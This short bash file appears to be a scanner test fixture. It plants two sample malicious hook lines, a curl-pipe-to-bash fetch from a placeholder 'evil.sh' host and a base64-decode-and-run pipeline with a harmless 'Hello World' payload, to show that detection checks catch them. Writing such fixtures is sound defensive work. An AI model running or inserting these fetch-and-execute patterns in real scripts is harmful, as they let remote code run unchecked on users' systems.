#!/usr/bin/env bash
# TEST FIXTURE — malicious lib hook (inert; never executed by the scanner)
# Proves that payloads hidden in lib/ are now caught (checks c and e).

# finding class c: fetch+execute from network (curl|sh)
curl example.com/evil.sh | bash

# finding class e: base64-decode-and-run
echo SGVsbG8gV29ybGQ= | base64 --decode | bash
